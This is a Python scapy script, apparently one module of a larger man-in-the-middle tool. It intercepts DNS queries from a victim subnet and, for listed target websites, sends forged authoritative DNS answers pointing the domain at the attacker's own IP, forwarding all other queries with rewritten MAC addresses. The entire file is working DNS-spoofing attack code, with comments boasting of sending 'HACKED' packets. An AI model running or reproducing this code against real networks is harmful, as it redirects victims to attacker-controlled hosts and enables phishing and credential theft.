from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
import sys
import os
import ipaddress 
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
from mac_management import *

def dns_sorting_start(pkt):

    websites = WEBSITES

    dns= ATTACK_STATUS['dns']
    victims = ATTACK_STATUS['victims']

    network = ipaddress.ip_network(victims, strict=False)

    if pkt.haslayer(IP) and pkt.haslayer(DNS): #check if there is an IP and DNS layer
        src_ip = pkt[IP].src 
        dst_ip = pkt[IP].dst
        dns_check(websites, dns, network, pkt, src_ip, dst_ip)


def dns_check(websites, dns, network, pkt, src_ip, dst_ip):

    if pkt[DNS].qr == 0 and ipaddress.ip_address(src_ip) in network and dst_ip == dns: #if it's a request we want to block the one from the victim to the dns server

        domain_name = pkt[DNS][DNSQR].qname.decode('utf-8')
        website = match_website(websites, domain_name)

        if website: #if there is a corresponding website in out data

            if src_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
                if pkt[DNS].qd.qtype == 1:
                    #print('-----------------------------------------------------------------------', flush=True)
                    #print("CREATE DNS RESPONSE , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
                    #print('-----------------------------------------------------------------------', flush=True)
                    create_dns_response(website, dns, network, pkt, src_ip, dst_ip, domain_name)        
                    return
                else:
                    return
            else:
                forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
        else:
            #print('-----------------------------------------------------------------------', flush=True)
            #print("FORWARD 1 , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
            #print('-----------------------------------------------------------------------', flush=True)
            forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
    else:
        #print('-----------------------------------------------------------------------', flush=True)
        #print("FORWARD 2, " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
        #print('-----------------------------------------------------------------------', flush=True)
        forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package

def remove_trailing_dot(s):
    if s.endswith('.'):
        return s[:-1]
    return s

def match_website(websites,domain_name):
    if websites :
        for website in websites:
            if remove_trailing_dot(domain_name) in website[1]:
                return website
    return False

def forward_dns(pkt, dst_ip):
    
    pkt[IP].chksum = None  
    pkt[UDP].chksum = None  
    
    self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))
    pkt[Ether].src = pkt[Ether].dst #we replace the sender MAC with our
    dst_MAC = get_MAC(dst_ip)#we replace the destination MAC by the real one 

    if dst_MAC:
        pkt[Ether].dst = dst_MAC
        sendp(pkt)
    #    if IP in pkt:
    #        print("Forwarding package from" + str(pkt[IP].src) + " to " + str(pkt[IP].dst) + " for domain name "+ str(pkt[DNS][DNSQR].qname.decode('utf-8')) + " On a request " + str(pkt.getlayer(DNS).qd.qtype))
    #    else :
    #        print("Forwarding package")
    #else:
    #    print(f"Error: Unable to resolve MAC address for {dst_ip}")
        #SINON AFFICHER QU'IL Y A UN PB


def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, domain_name):
    #we just need to switch everything and add the response with our mavelous IP
    iface = str(ATTACK_STATUS['iface'])
    spoofer_IP = get_if_addr(iface)

    fake_ether = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) #MAC
    fake_IP = IP(src=pkt[IP].dst, dst=pkt[IP].src) 
    fake_UDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    fake_DNS = DNS(
        id=pkt[DNS].id, #same id
        qr=1, #it's a reponse
        aa=1, #it's an Authoritarian response
        qd=pkt[DNS].qd, #we capy the request
        an=DNSRR(rrname=domain_name,ttl=10,rdata=spoofer_IP)
    )
    fake_dns_response = fake_ether/fake_IP/fake_UDP/fake_DNS
    sendp(fake_dns_response, verbose=False)
    print("Send an HACKED package at "+ str(fake_dns_response[IP].src) + " for domain name "+ str(fake_dns_response[DNS][DNSQR].qname.decode('utf-8')))
